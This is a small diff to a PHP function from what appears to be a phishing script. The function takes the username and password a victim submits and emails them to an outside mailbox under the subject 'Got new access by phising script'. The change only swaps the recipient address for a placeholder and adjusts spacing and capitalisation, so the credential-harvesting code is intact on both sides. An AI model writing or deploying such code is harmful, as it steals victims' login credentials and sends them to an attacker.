@@ -5,15 +5,15 @@
 		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
 			return false;
 		}
-
+		
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "gachuaadarsha@gmail.com";
+		$reciever = "exemple.mail@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
-		$message .= "and password is ". $password;
+		$message .= "And password is ". $password;
 		
 		return mail($reciever, $subject, $message);
 	}
